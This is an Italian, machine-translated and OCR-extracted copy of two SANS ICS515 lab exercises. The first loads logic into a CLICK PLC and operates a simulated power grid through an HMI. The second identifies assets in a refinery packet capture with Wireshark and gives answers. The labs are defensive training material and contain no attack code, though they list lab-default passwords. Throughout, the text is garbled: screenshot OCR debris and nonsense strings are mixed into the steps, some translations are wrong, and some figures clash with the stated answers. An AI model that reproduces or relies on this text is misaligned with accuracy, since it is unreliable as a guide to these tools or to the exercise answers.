Compito: caricare la logica operativa nel PLC

1. Aprire la macchina virtuale Windows
2. Caricare il file della logica operativa nel PLC

3.

> Nella cartella ics515 individuare: “ICS515 Site Acceptance Test V1.ckp
> Fare doppio clic sul file per avviare il software di programmazione CLICK con il progetto

Software di programmazione CLICK {Versione 3.01) - |CS515V8 per schede di produzione.ckp - [Programma principale] = oa x
Fie = [pHomes ft Visualizza Impostazione Programma narucion PLC Finestra Monitor Hep i ence hail

BOR Gp 4 Gino {Rung Commenti i ivi § a addessPicker = Parrucca 2 Ofine | FAsau
< ise He Aline 1 Ades Consenots © Riferimento incrociato Wy Dec Mode FB oeta view -
yrse Soprannomi Softee fej Controllo sintassi POPE GR) Oc nae

Programma Funzione PLC
Md inizializza a
~ Mg] Comando remoto
~ tagga TransAlorms
Trasmissione J
gy TransStates
_ fF Programma di interruzione
 @ Selettore indirizzi
@ Modifica commenti ramo
Informazioni sul programma locale LD

Inizializzare

o Contatto sul bordo
& Confrontare

T
Eh afferma

Chiamata,
generazione di una volta

Una chiamata di controllo della sintassi
'Vista riferimento incrociato iG > Gen_Fuel_Controt
eB] Monitorare
BY monitoraggio dello stato

Tutto,
2 censtar

Visualizzazione della data su FB
Visualizzazione dati EB! v

Biinene

Wbioteger2words) Virgola mobile He (Etec (Alasci ——---_——oonovaoon.—C2-0icu,

All'apertura dell'applicazione, trovi nel menu in alto l'icona con la freccia rossa rivolta verso il basso a cui sei abituato
Scrivere un progetto in un PLC

© 2021, Robert M. Lee Lab2.1- 1
ows seit wb ww

vo wv © wo

ss FS FF FT we wT Ww

Lab 2.1-— Funzionamento del processo

e Caricare la logica operativa nel PLC

e Connettersi e visualizzare i settori operativi tramite un HMI

e Comprendere le dipendenze dei processi, il normale funzionamento del sistema, le operazioni di emergenza e gli errori
modalità

Questo esercizio utilizzerà la macchina virtuale Windows e il kit SANS ICS515 Student. Per la risoluzione dei problemi fare riferimento a
I passaggi dell'esercizio 1.1 (inclusa la modifica dell'IP nell'intervallo 169.254.x.x/16, se necessario).

Compito: caricare la logica operativa nel PLC

1. Aprire la macchina virtuale Windows
2. Caricare il file della logica operativa nel PLC
> Nella cartella ics515 individuare: “ICS515 Site Acceptance Test V1.ckp
> Fare doppio clic sul file per avviare il software di programmazione CLICK con il progetto

Software di programmazione CLICK (Versione 3,01) - ICS515V8 per Production Boards.ckp - [Programma principale] - a x
erp on i
BOR Gem an + Curr |) Rung Commenti

Visualizzazione dettagliata FB della mia modalità DC -
RB CpPCE ret
La Stati af

Programma Funzione PLC

avvio

Ney RemoteCommw0
Sì, TransAlarms
gy Trasmissione
gy TrenStates
Programma di interruzione BP
© Selettore indirizzi
'gf Modifica commenti rung
<x) Informazioni sul programma locale
Controllo della sintassi
16) Vista dei riferimenti incrociati
Monitoraggio dell'equalizzazione
Monitoraggio dello stato AB

Chiamata ,
Inizializzare
Chiamata,

[oem Geni States

Tutto,
—— Generazione

Cal
> Controllo carburante gen

Contatto
Contatto GB (NO)

Contatto GB (NO)

un contatto sul bordo

[Confronto EB

3. Quando si apre l'applicazione, trova nel menu in alto l'icona con la freccia rossa verso il basso che viene utilizzata

Scrivere un progetto in un PLC

© 2021, Robert M. Lee

Laboratorio 2.1-1
Apparirà una schermata di connessione, potrebbe essere necessario selezionare Ethernet nel menu a discesa Tipo di porta e
potrebbe essere necessario selezionare l'adattatore Intel 82574 (Asix così come viene presentato tramite il Bridge alla VM)
nel menu a discesa Adattatore di rete. Se non vedi l'adattatore Intel nel menu a discesa, allora
dovrai rivedere le impostazioni di rete e assicurarti che l'adattatore sia connesso all'host e non

eo

o

la VM. Dovresti vedere un PLC che è stato scoperto.

Connettersi al PLC CLIC

"Cambia hub."
«Questo computer eee.»
ss
ke r
" Bthemet o Ethernet i
Connessione diretta

Posizione del PLC CLICK di destinazione

Tipo di porta: Ethernet =
@ nella stessa LAN (scansiona automaticamente tutti i PLC CLICK nella LAN.)

Adattatore di rete: bd
questa LAN (è necessario allocare l'IP e il numero di porta 5
Reeser By) Oouside (inserisci l'indirizzo 1P e por manualmente.)
tress! | Nome PLC Indirizzo BP Maschera sottorete - Numero parte Stato modalità firmware. Mac
Papà: «192. 168.0.8: oe

Sf Go00 TEE

}i92,168.0.10 —1255.255.255.0 _|C2010PU [ver3.00 |
Maschera di sottorete: 255.255.255.0

Gateway predefinito: 0.0.0.0

Fare clic sul pulsante Connetti
Inserisci la password “sansics123”.

eo

fe

.3 °e rs)

UN]

Quando richiesto, è possibile continuare con l'esecuzione di una modifica in fase di esecuzione oppure scegliere di posizionarla
l'interruttore del PLC in posizione STOP. Se si procede con la modifica Run Time, scegliere STOP PLC e
Opzione Continua, che ti chiederà quindi di tornare in RUN dopo che il progetto è stato scritto

il PLC. Ciò ti risparmia semplicemente i passaggi necessari per attivare l'interruttore sul PLC.

© 2021, Robert M. Lee

Laboratorio 2.1-2

7]

C

3

>

3

Mel
oY WD © WwW ww WY noi noi wewewwe noi ww

oovs FF OU YD UF WD W

rito Progetto nel PLC
computer

Nome del progetto: {ICSS15V8 per schede di produzione
Dimensioni del programma (totale: 8.000 passaggi)
Dimensioni WiProgram: 1.173 passaggi (14,66%)
Area libera: 6.827 passi (85,34%)

o 8.000

File di progetto (totale: 262.144 byte)
WiProject Fie Suze 35,416 byte ( 15,03 %)
Avea gratuita: 222.728 byte (84,97%)

°262.144

Ultimo aggiornamento: 2ul 08,2021, 14:35:55

(A Scrivi il file del progetto nel PLC
Abilitando questa opzione, il file del progetto sarà
scaricatoiWrite) nel PLC. Se vuoi disabilitare
caricamento del progetto{Leggi), disabilita questa opzione.

8. È possibile chiudere il software di programmazione CLICK

Attività ~ Avviare l'interfaccia operatore uomo-macchina (HMI)

1.Aprire il server MatrikonOPC per l'applicazione Modbus

Al Apes

Racuments Satan Web Altro

® lectez tt peronan 3

Documenti

= Server MatrikonOPC per Modbus
Guida Rapida

'= Server MatrikonOPc per Modbus
Manuale d'uso

Suggerimenti per la ricerca
2 server matiikonOPC per modbus - vedi
-_

P server matrikonOPC per modbud

2. Selezionare Sì alla richiesta di sicurezza UAC
3. Selezionare File dal menu dell'applicazione
4. Selezionare la configurazione di importazione

PLC

[ez-o1ceu |
Nome progetto: [ICS515 Mfg V3 per schede di produzione |
Dimensioni del programma (totale: 8.000 passaggi)

Tipo di processore:

Dimensione BiProgram: 265 stens{ 3,31 %)
Area iFree: 7.738 passi (96,69%)
t) 8.000

File di progetto (totale: 262.144 byte)

File WiProject Sue 17.456 byte (6,65 %)
Aree WiFree: 244.688 byte ( 93,35 %)
t) 262.144
Ultimo aggiornamento: 3 07,2021, 19:33:48
Modifica dell'ora ARUN

Abilitando questa opzione, il programma verrà scaricato in
il PLC senza portare il PLC in STOP

modalità.
[Ce]

Server MatrikonOPC per Modbus

@ Server MatrikonOPC per Modbus - {Locathost

File | Guida alla finestra di visualizzazione di Edt

1) Nuova configurazione

un acc
Locale *,

Uscita

importa configurazione...
Esporta configurazione.

voi

}

Server OPC matrici EB per Mota

© 2021, Robert M. Lee

Laboratorio 2.1-3
5. Passare a Desktop\ics515\Seleziona: 1C$515_Matrikon_Config

] File adatta finestra visualizzazioni _ Hele

© gf Brewer comguavon x
a nL Tene + Deiaog > Sudan Fer STS Sen 2
oH om Adesso ee -30

accesso fe Gack

© C8815 Matikon Conf
(Desktop 18515, Configurazione Matilion

6.

iC Conferma x '|

\ Stai per sostituire la configurazione attualmente attiva.

Vuoi esportarlo per un uso successivo prima di procedere?

Annulla

7. Fare clic con il pulsante destro del mouse su MatrikonOPC Server per Modbus > Persistenza > imposta come predefinito
@ MatrikonOPC Server per Modbus - (Pagina iniziale]

@ Guida della finestra di visualizzazione file

un 2

@ tx - @ Bie en

Posizione | MyMatrikonOPC » Host locale » MatrikenOPCServerperModbus >

8. Chiudere l'applicazione MatrikonOPC Server per Modbus
9. Fare doppio clic sull'icona Riavvio servizio Matrikon per arrestare e avviare il servizio Matrikon

11. Se si riceve un avviso di licenza che indica un limite di 2 ore, selezionare OK.

© 2021, Robert M. Lee Lab 2.1- 4

@ a ® &® @® &

eo

®2@oeennhemnheeeeteneaee

Questa notifica verrà inviata sette giorni dopo il lancio iniziale del corso Windows VM, quindi dovrebbe essere così
non viene visualizzato negli studenti in classe, tuttavia gli studenti su richiesta potrebbero riscontrarlo. Qualunque cosa
continuerà a funzionare e tutti i laboratori funzioneranno, tuttavia, dopo il periodo di licenza di 7 giorni, l'HMI
runtime rimarrà aperto per periodi di 2 ore e poi si chiuderà, richiedendoti di rilanciarlo quando

VuuUuvUeuUbebe pecore

uv wo Ww

)

\P

)

wo Ww¢

necessario per un laboratorio.

FactoryTaik View ME Station (limite di 2 ore]

È stata trovata una licenza FactoryTalk View ME Station. Il runtime si chiuderà

giù in due ore.

12. Fare clic su Sì nel prompt e quindi attendere: stanno accadendo cose belle, potrebbero essere necessari 10 secondi, sii paziente

Sostituisci la directory di sistema locale

13. Fare clic su Sì nel prompt dell'UAC

Directory di sistema FactoryTalk dell'applicazione per utenti e policy
verrà caricato su questo terminale. Il sistema FactoryTalk esistente
La directory verrà archiviata e verrà ripristinata automaticamente dopo il
l'applicazione runtime è chiusa.

Chiudi tutti gli altri programmi che stanno attualmente accedendo a Local
Elenco di FactoryTalk. Selezionare SÌ per continuare o selezionare NO per annullare
il caricamento di questa Applicazione.

NO
SE8}

Controllo dell'account utente

Vuoi consentire a questa app di creare é
modifiche al tuo dispositivo? ;

“BE UnpackMeR.dll in FactoryTalk Linx

Editore verificato: Rockwell Automation
Origine del file: disco rigido su questo computer

Mostra più dettagli

14. Selezionare il pulsante "Esegui applicazione".

© 2021, Robert M. Lee

Lab2.1-5
15. Mentre l'HMI si carica, vai alla schermata principale - Con gli interruttori sulla scheda in posizione Aperto
e Intertie Open, nel nostro sistema elettrico simulato non è disponibile energia per sostenere il carico.

FactoryTalk View ME Station - 10.00,00.290(Patch 03)

Applicazione attuale

ICS515V1.mer

Carica l'applicazione Esegui l'applicazione
SE) (F2i

Impostazioni dell'applicazione
(F3]

Elimina file di registro
Prima di correre
(FS)

Impostazioni del terminale

SÌ

@ NO

[HMI del sistema di alimentazione Bf - Principale

'Generazione

Trasmissione da piazzale di commutazione
Esso
Relè di protezione interruttore redken uscita MW
Aperto Chiuso Aperto Chiuso Reset errore
\ N me 7S 4 N \ Fe

Generatore

1
'
1
1
~T
Carica T
T min <> T max
0 T
"N7
mmm lA_Richiusura
ks é.] ! fra Apri Chiudi
'ZN
y ¢ 1 N 4
Q Caricare
7\. Misuratore di potenza (96) 'ns | Min <> Max
ehm come
1ZX e C8
© 2021 SANS'ere) | ee)
Prodotto negli Stati Uniti 1 Ps 190
Industria —] \ CDairibaton —

«Interruttore della trasmissione ribaltato
La generazione è un'arma critica

'Generatore locale Nott Min per interruttore chiuso
Area di generazione Braccio critico

Generatore locale non al minimo per Steater chiuso
Notf min generatore locale per interruttore chiuso

16. Siamo effettivamente in una condizione di “blackstart” e procederemo attraverso una startup.
17. Inizieremo accedendo alla scheda Generazione

18. Dalla schermata Generazione andremo ad eseguire alcune operazioni manuali iniziali

© 2021, Robert M. Lee

X

Laboratorio 2.1-6

e,
www we OWUUUCTOWOKCOHOKHHOKCHH eS

19. Verificare che il controllo della valvola del carburante CT sia in Manuale e che il generatore sia in Manuale. In caso contrario, premere il
Pulsante manuale in entrambe le aree

|

Controlli della valvola del carburante CT

@ Modalità manuale
O Modalità automatica™
@® Locale Fare clic su PLC

1% Aperto © OpenPic

Locale o Manuale

Modalità
PLC
Aprire! Modalità i

Aria in ingresso

@ CT in funzione O AVR acceso
Modalità esperto

OCT interrotto © Modalità manuale —~
Sim8

On=UsePB's Start | Manuale di tensione

Spento = modalità di regolazione dell'avvio automatico

7
Spento

UN
io WR) | 100| Mw

20. Con entrambe le impostazioni in Manuale, inserire 50 nel campo Setpoint modalità manuale della valvola del carburante CT e inserire 100
nel Setpoint modalità manuale turbina di combustione (utilizzando il tastierino numerico di immissione dati, inserire il valore
vuoi e poi usi la freccia in basso a destra che indica Invio)

é

*Nota* Fare clic su e riconoscere tutti gli allarmi di ripristino rossi; mentre procedi per cancellare gli allarmi
durante la procedura di avvio di Blackstart in questo laboratorio.

21. Passare alla scheda Trasmissione e distribuzione e fare clic sull'interruttore Generazione intertie verde
dovrebbe diventare rosso indicando una condizione energizzata.

Franamissiano | | Tendenze industriali residenziali Accedi igs

Distribuzione della generazione 14:05:42

TRASFERIMENTO AUTOBUS

| Lamda
Trasmissione
Interruttore SI

j [Fauno] 0 [vedere

Consumo MW | Consumo di MW
0 % ‘ 0 mw
ag BS sa
© 2021, Robert M. Lee Lab2.1-7
22. Con il collegamento intermedio chiuso (rosso = energizzato) al sistema elettrico principale, ritornare al
Schermata di generazione e chiudere l'interruttore del piazzale di generazione

fs Trasmissione ‘ ‘TiRi2021
Principali generazioni (| gymemision | Tendenze allarmi industriali residenziali Gli accessi sono EXIT
La valvola del carburante CT controlla lo stato di interblocco della generazione
e © modalità tonale Bee) eee | @trterie On
% O Modalità automatica Be Pascal Breaker Permissivi
@ Locale Fare clic su PLE z © Gscecatee Renning
% Apertura © OpanPLc @ Trans. Interruttore chiuso
@Trad. Relè di protezione
Localizzatore manuale © Carica presente
Setpoint di controllo del controllo
/'
Serie] RIEIN| [-] uno
Turbina a vapore ad aria aspirata
"cioè
Turbina a combustione
100 Mw
@ Cr In esecuzione OAVR Acceso Alimentazione Alimentazione Alimentazione
Modalità Esperto ©) CT Arrestato Modalità @Manval Attiva Generazione Consumo Disponibile
onstseps | SBR Tensione Manuale Industiat [0] MW Locale [100] mw Locale [_ 200) ww
o pes. Mib Mie < Modalità — 7
Off = Regolazione avvio automatico Resiterita 77 ] WW intertie 0 MW Intertie 500 nw
—ea
Off <a MW) Totale ww Totale 100 mya Totale | 780 Mw

23. Ora dovresti vedere 100 MW di generazione immessi nell'interconnessione
24. Passare alla scheda Trasmissione e distribuzione e reimpostare il relè di protezione, quindi chiudere

Interruttore di trasmissione Lambda

Principale Genersticn residenziale

Allarmi industriali

TRASFERIMENTO AUTOBUS.

Login

Puledro ame] |

rane

22:35:34 RIT,

Generazione residenziale

AUTOBUS DI TRASFERIMENTO,

Industriale

Login

Lambda
Trasmissione
Protezione

e.
en.
ehi

© 2021, Robert M. Lee

Sal

7

risiteat
22:45:33.

Laboratorio 2.1-8

eo

eh.

o

oe, oe] o om @ oe o ca] oe wo o

°,
www wo wo Oo wow wow noi wo noi wy

oe)

\p TY \p 'py

vy

25. Passare alla scheda Residenziale e chiudere la Richiusura

Trasmissione

Generazione Allarmi Industriali Residenziali

e distribuzione

7/8/2024
22:48:39.

Login

Via della trota di lago

26. Prima di iniziare ad aggiungere carico al sistema, tornare alla scheda Generazione e inserire la valvola CT

Carico corrente
Carico massimo

Controllo in Auto e controllo della Generazione in Regolazione Automatica della Tensione (AVR)

Trasmissione

Generazione | |g Distribuzione

Residenziale

Controlli della valvola del carburante CT

&

0

Locale o
OpenPLC
Controllo

Modalità esperto
Sim8

On = Usa PB

Spento = Avvio automatico

Di

O Modalità manuale
@ Modalità automatica
@ Locale Fare clic su PLC
©OpenPLe

Manuale
Modalità
Punto di riferimento

50

@CTRunning @ AVR attivato

OCT interrotto © Modalità manuale attivata

Voltaggio
Regolamento

Aria in ingresso

Manuale
Modalità

yassetpount....

| mw

27. Ruotare i quadranti dei quadranti Residenziale e Industria verso l'alto per aggiungere carico. Dovresti vedere il generatore MW

l'uscita aumenta per soddisfare il nuovo carico

28. Passa alla scheda Tendenze e seleziona Alimentazione, ora se manipoli i quadranti di carico dovresti vedere questo

aumento/diminuzione del carico visualizzato

© 2021, Robert M. Lee

Laboratorio 2.1-9
Trasmissione
e distribuzione

7/8/2021

Residenziale Industriale 17:43

Generazione

Consumo di energia

(MW)
iniziale (MW)

Intertie: disponibile rispetto all'offerta
BB aAvailadie (ww)
Fornitura BB (aw)

Generazione locale: disponibile rispetto all'offerta

Vicino

Raffineria A MW Draw [299 | mw Raffineria B
ea;

sull'uscita di corrente [99 % oe
Sor Maxuw [300 |] uw ae

30. Navigare attraverso le schermate dei quattro quadranti e fare clic sul pulsante Reimposta allarme per confermare
allarmi passati.

31. Una volta completato, sentiti libero di osservare ulteriori tendenze, mentre manipoli il sistema
i controlli fisici sulla scheda o tramite l'HMI.

© 2021, Robert M. Lee Lab 2.1-10

@® @ ®@® ®@ ® ® ® WW ®

ww
wowwwwwww www ww wy

noi noi w

oe ww G&G ww

“3ee Ww

[se HMI del sistema di alimentazione - Principale _ x

Trasmissione
e distribuzione

7/8/2021
17:02:08

Generazione residenziale Tendenze industriali Login

USCITA

Trasmissione

Switchyard = Configurazione
Relè di protezione interruttore rotto in uscita MW
Aperto Chiuso Aperto Chiuso Reset errore
N7 » ¢N7
ZN7 oN
Generatore } |
S16. /10-
eh
OTS /o-
oOo—
T
T
1
Richiusura dell'OAS
! ita Apri Chiudi
1/
1
WANN 5 4 Carica
7\. Misuratore di potenza(%) | ns) —| Min <> Max
1 ecc
LA e? 7 at
© 2021 SANS99 I ena fa ae
Prodotto negli Stati Uniti i y Lc? 100
Distribuzione del settore I
‘Ora sveglia ‘Ora conferma Messaggio — |
08/07/2021 16:58:10 Interruttore della trasmissione ribaltato
7182021 16:57:25 Allarme critico area di generazione
07/07/2021 16:57:25 Generatore locale NotAt Min per interruttore chiuso
08/07/2024 16:57:05 Allarme critico dell'area di generazione
08/07/2021 16:05 Generatore locale non al minimo per interruttore chiuso
09/07/2021 16.56.55 Generatore locale non al min per interruttore chiuso
7112021 16:56:53 Allarme critico area di generazione

Compito: eseguire un'operazione manuale sul campo

1. Con il sistema attivo e le suddivisioni residenziali sotto tensione (ovvero le tre case sono illuminate)

2. Simulare un guasto al sistema di alimentazione (famoso attacco di scoiattolo, auto che si schianta contro un palo, cavi abbattuti a causa di
temporale, ecc) che provoca una perdita di carico cliccando il pulsante di apertura richiusura distribuzione presente sulla scheda.

3. Dovresti notare che il carico industriale non è influenzato, dovresti anche vedere riflesso il cambiamento di stato
sull'HMI

4. Inoltre nell'HMI è presente un allarme critico, questo stato di allarme impedisce la chiusura
la richiusura in campo (tentativo di premere il pulsante di chiusura in zona residenziale).

5. Cancellare la condizione di allarme dal campo spingendo l'interruttore Sim 6 su uno stato On e quindi ruotandolo
spento. (Noterai che la condizione di allarme è stata riconosciuta nell'HMI dal campo)

6. Prova ora a premere il pulsante di chiusura per ripristinare l'alimentazione nell'area residenziale

7. Quando il sistema è in una condizione di allarme non riconosciuto, solitamente si tratta di un'indagine/o di un'ispezione
dovrebbe verificarsi per riconoscere l'allarme e riattivare il sistema, nel caso in cui si verificasse un
preoccupazione per la sicurezza sul campo

© 2021, Robert M. Lee Lab2.1- 11
Informazioni aggiuntive

La SIM card può fornire utili controlli manuali nel caso in cui l'HMI dell'operatore non sia disponibile:
e Sim 1: controllo della valvola del flusso del carburante del generatore
o O=Nessun PLC remoto
o 1=Controllato da PLC remoto
Sim 2: Valutazioni estate/inverno per il relè di protezione
o O=Inverno
o 1=Estate
e Sim 3: Ripristino intertie
oO=NA
o 1=On (se aperto, chiuderà)
e Sim 4: Riconoscimento allarmi di generazione
e Sim 5: Riconoscimento Allarmi Trasmissione
e Sim 6: Riconoscimento Allarmi Residenziali Distribuzione
e Sim 7: Riconoscimento Allarmi Industriali Distribuzione
e Sim 8: modalità esperto
o O=Spento
o 1=On (generazione esecuzione con pulsanti Start/Stop)

Caricamento dati:
Carico industriale totale 300 MW
Raffineria A = 120 MW (40% del carico industriale totale)
Raffineria B = 120 MW (40% del carico industriale totale)
Carico impianto ausiliario = 60 MW (circa il 20% del carico industriale totale)

Carico residenziale totale 100 MW

Informazioni sulla generazione:
Capacità nominale totale della generazione = 280 MW

Condizioni operative degne di nota:

La generazione locale non può servire il carico totale industriale e residenziale, quindi questo sistema è un importatore netto
quando è a pieno carico e l'Intertie deve essere chiuso. Se a pieno carico e l'Intertie scatta, il sistema lo farà
far scattare il generatore.

Con l'Intertie chiuso, tutto il carico può essere servito dal sistema elettrico principale senza alcuna generazione locale

*Importante* Il servizio Matrikon potrebbe andare in timeout o bloccarsi e potrebbe essere necessario riavviarlo per stabilirlo
comunicazioni con l'HMI. Fare doppio clic sull'icona sul desktop per riavviare il servizio se l'HMI si arresta
ricevere aggiornamenti sullo schermo.

© 2021, Robert M. Lee Lab 2.1 — 12

fe

=

4

Ce

piedi
vouvuwveuvewbvbuveweweuweoewe7e

vo vs vw Ww WwW

a’ Ss VS VS |

Noterai che il PLC e la scheda continuano a funzionare indipendentemente dal runtime dell'HMI, comunque lo farai
probabilmente vorrai che il runtime sia attivo e che comunichi mentre esegui i laboratori successivi in ​​cui esamini la rete
comunicazioni.

Esercizi da asporto

Comprendere le capacità operative disponibili tramite l'HMI e localmente "sul campo" tramite manuale
controlli sul tabellone. Inoltre, è importante essere consapevoli di come funziona il sistema con le interdipendenze
attraverso la produzione di energia, la trasmissione, la distribuzione e il carico industriale, come inizieranno a fare i laboratori successivi
"utilizzare male" il sistema e sapere come si presentano le normali operazioni aiuterà a identificare le anomalie
eventi operativi.

© 2021, Robert M. Lee Lab 2.1- 13
_Lab 2.2 - Analisi del traffico ICS

aa

Obiettivi

e Identificare i dispositivi aziendali e di controllo attraverso i protocolli e le comunicazioni di IT Discovery

*Informazioni sullo scenario* Nel contesto dello scenario, abbiamo una cattura di base dalla raffineria di Calistoga.
Come team di sicurezza dobbiamo analizzare l'acquisizione per determinare eventuali informazioni identificative sulle risorse che
ci aiuterà a capire il loro contesto e i loro ruoli.Questo laboratorio utilizzerà la VM RELICS. Sul desktop della VM è presente una cartella identificata come C5515. Dentro,
c'è la cartella calistogarefinery e poi la cartella pcaps che contiene l'acquisizione del pacchetto
normalops.pcap che verrà utilizzato durante questo laboratorio.

Domande

1. Quanti sono gli asset Ethernet univoci (non broadcast o multicast).
sulla rete?

2. Quanti sono gli asset IPv4 univoci (non broadcast o multicast).
sulla rete?
3. Quali sono i protocolli IT di “discovery” più utili per le informazioni sugli asset presenti in questo pcap?

4. Quali sono gli indirizzi IP e (se disponibili) quali sono i nomi host delle risorse Enterprise (L4/L5)?

© 2021, Robert M. Lee Lab 2.2-1
5. Quali sono gli indirizzi IP e (se disponibili) quali sono i nomi dei tubi delle risorse OT (L3 e inferiori)?
6. Quale fornitore ICS produce il PLC?
© 2021, Robert M. Lee Lab 2.2-2

,

ee ee ee ee ee |
DP Dw Ww wD DP DP Ww Ww

va

Attività: identificare gli indirizzi Ethernet, gli indirizzi IP e i protocolli ICS in small_baseline.pcap

1. Quanti sono gli asset Ethernet univoci (non broadcast o multicast).
sulla rete? 16

> Avvia la tua VM RELICS
> Accedi alla VM

> ACCEDI =reliquie
> PASSWORD = reliquie

> Apri normalops.pcap in Wireshark
> Aprire la cartella ICS515 situata sul desktop e quindi accedere a calistogarefinery > pcaps
> Fare doppio clic su normalops.pcap per aprire il file in Wireshark

Gat Home Desktop

ICS515

piselli calistogarefinery + Q 8 =. = Qox

® Recenti

wo Ww

wp

incidente.pca 196.4MB 2348 + &
%&Pisello stellato °
Gt Home normalops.pcap 37,1 MB 2339 ok
© Desktop “NN

Documenti

I recneethae

sì

wp

*Nota* Una volta caricata l'acquisizione, ciò che vedi sullo schermo è il traffico di rete derivante dall'acquisizione,
incluso l'ora in cui è stato visto dalla scheda di interfaccia di rete (NIC), la sorgente, la destinazione, il protocollo, la lunghezza,
e informazioni di accompagnamento.

>: identifica gli endpoint univoci nel traffico
> Nella parte superiore del pannello Wireshark, fai clic su Statistiche

ue © Ww © Ww Ww

> Fare clic su Endpoint

Analizzare

Guida agli strumenti wireless di telefonia
Cattura proprietà file Ctrl+Alt+Maiusc+c
Indirizzi risolti

Gerarchia dei protocolli

Conversazioni

Endpoint

Lunghezze dei pacchetti

Grafico 1/O

Tempo di risposta del servizio r

RUIeN INAATO chiacchierando

© 2021, Robert M. Lee Lab 2.2-3
*Nota* L'opzione Endpoint consente di visualizzare gli indirizzi logici univoci nell'acquisizione di rete nei vari
livelli, inclusi l'indirizzo Ethernet, l'indirizzo IP e le porte TCP o UDP

> Registrare il numero di indirizzi Ethernet univoci
*Nota* Wireshark identifica automaticamente l'identificatore univoco organizzativo (OUI), che riprende il file

primi 3 byte dell'indirizzo Ethernet (o MAC). Per esempio. SiemensN_0d:3d:3f. Puoi disabilitarlo deselezionando il file
Casella di risoluzione del nome nell'angolo in basso a sinistra. Quando si registrano gli indirizzi Ethernet univoci, non includerli

indirizzi multicast e broadcast. Inoltre, puoi ordinarli facendo clic sulla colonna "Indirizzo".

Ethernet-27 IPv4-23 IPv6-18 TCP-11 UDP-62

Indirizzo * Pacchetti Byte TxPacchetti TxByte Rx Pacchetti Rx Byte
-Rockwell_5a:72:ce 177.969 26M 89.666 13M 88.303
Rockwell_da:32:12 50.471 6.883 mila 25.441 3.612 mila 25.030
Rockwell_fa:a9:45 29.882 3.336 mila 14.798 1.678 mila 15.084
Rockwell_c5:c5:f2 20 1.200 20 1.200 0
| RealtekS_12:03:b5 14 10k 14 10k )
IPv4mcast_16 10 600 0 i) 10
IPv4mcast_fb 4 400 0 0 -
IPv4mcast_fc 8 602 0 0 8
IPv6mcast_Oc 14 10k 0 è] 14
IPv6mcast_16 10 900 0 0 10
IPv6mcast_Fb 4 480 i) 0 4
IPv6mcast_01:00:02 244 37k 0 0 244
IPv6mcast_01:00:03 12 1,126 it) 0 12
IPv6mcast_ff:3c:b1:88 2 172 0 0 2
IPv6mcast_ff:96:88:9b 2 172 0 cioè) 2
Pegatron_8d:59:1e 80 18k 80 18k )
Pegatron_8d:59:1F 16 1.360 16 1.360 0
Dell_3c:53:04 48 6.292 48 6.292 f)
Dell_3c:53:05 28 4.498 28 4.498 è)
Dell_3c:53:06 28 4.498 28 4.498 0
Dell_3c:53:07 29 4.651 29 4.651 0
Dell_3¢:53:08 39 5.691 39 5.691 0
Dell_3c:53:09 110 11k 82 8.830 28
Dell_3c:53:0a 89.758 10 milioni 44.506 5.045k 45.252
Dell_3c:53:0b 108.874 19M 54.146 9.244k 54.728
Dell_3c:53:0c 30 5.122 30 5.122 it)
Trasmissione___ 236 3tkK 8H
v e risoluzione Limite per visualizzare il filtro

*Risposta* Esistono 16 indirizzi Ethernet univoci. Ciò non significa che ci siano 16 dispositivi fisici simili
computer ma vengono invece visualizzate 16 schede di interfaccia di rete (alcuni dispositivi possono avere più schede di interfaccia).

© 2021, Robert M. Lee

Laboratorio 2.2-—4

ynrents#sksfhk_Fsethesehfs fs ® @,

®)
sì

2. Quanti sono gli asset IPv4 univoci (non broadcast o multicast).
sulla rete? 16

> Identificare gli endpoint IPv4 univoci nel traffico
> Nella parte superiore del pannello Wireshark, fai clic su Statistiche
> Fare clic su Endpoint
> Fare clic sulla scheda IPv4

Ethernet - 27 IPv4 - 23 | IPv6 - 18 TcP - 11 UDP - 62

'Indirizzo _—s* Pacchetti Byte TxPacchetti Tx Byte _Rx Pacchetto
0.0.0.0 36 12k 36 12k
10.10.0.10 8 988 8 988

/10.10.0.20 2 520 2 520

| 10.10.0.30 2 520 2 520
10.10.0.40 2 520 2 520
10.10.0.50 4 1.028 4 1.028

10.10.1010 79 «7.234 52 4.472
10.10.10.20 59.848 6.681 mila 29.680 3.363 mila
10.10.30.10 108.869 19M 54.143 9.244k
10.10.10.40 2 530 2 530

| 10.10.20.10 176.303 26M 88.725 13M
10.10.20.20 29.882 3.336 mila 14.798 1.678 mila

| 10.10.20.40 29.882 3.336 mila 14.798 1.678 mila
10.10.20.50 51.923 7.053 mila 26.170 3.700 mila

| 10.10.255.255 88 11k 0 0

| 20.10.20.10 97 12k 97 12k
20.10.40.10 97 12k 97 12k

169.254.201.178 8 575 8 575

| 169.254.223.2685758575

| 224.0.0.22 10 600 0 0

| 224.0.0.251 4 400 0 0

| 224,0.0.252 8 602 0 0

| 255.255.255.255 102 17k 0 0

*Risposta* Esistono 16 indirizzi IPv4 univoci. 0.0.0.0 è in realtà tecnicamente un indirizzo ma i 169.254 lo sono
indirizzi per quando non è possibile connettersi al DHCP nonostante sia stato configurato per questo. Gli indirizzi che terminano con
255 e iniziando con 224 sono indirizzi multicast e broadcast.

© 2021, Robert M. Lee Lab2.2-5
3. Quali sono i protocolli IT di “discovery” più utili per le informazioni sugli asset presenti in questo pcap?

ARP.
MDNS
LLMNR
DHCP
DHCPv6
NetBIOS

> Identificare i protocolli di rilevamento IT più utili effettuando una ricerca nella Gerarchia dei protocolli

> Nella parte superiore

nel pannello Wireshark, fare clic su Statistiche

> Fare clic su Gerarchia protocolli

Protocollo

Analizza, Statistica Strumenti di telefonia
(2) Riepilogo
Riepilogo dei commenti

Mostra la risoluzione dell'indirizzo
eee Gerarchia dei protocolli
{© Conversazioni
: Endpoint
4 lunghezze del pacchetto...
*ta (0 grafico

Interni

« Pacchetti percentuali
100,0

~ Cornice
vEthernet

© 2021, Robert M. Lee

Protocollo Internet versione 6
~ Protocollo datagramma utente
Sistema di nomi di dominio multicast
Risoluzione dei nomi multicast link-local
DHCPv6é
Dati
Protocollo dei messaggi di controllo Internet v6
Protocollo Internet versione 4
» Protocollo datagramma utente
Servizio nomi NetBIOS
» Servizio datagramma NetBIOS
~ SMB (protocollo di blocco dei messaggi del server)
~ Protocollo MailSlot PMI
Protocollo del browser Microsoft Windows
Sistema di nomi di dominio multicast
Risoluzione dei nomi multicast link-local
EtherNet/IP (protocollo industriale)
Protocollo di configurazione host dinamico
Dati
~ Protocollo di controllo della trasmissione
~ EtherNet/IP (protocollo industriale)
» Protocollo industriale comune
» Gestore connessione CIP
Pacchetto non valido
Classe CIP generica
Protocollo di gestione dei gruppi Internet
Protocollo dei messaggi di controllo Internet
Protocollo di risoluzione dell'indirizzo

100,0

0,1
0,1
0,0
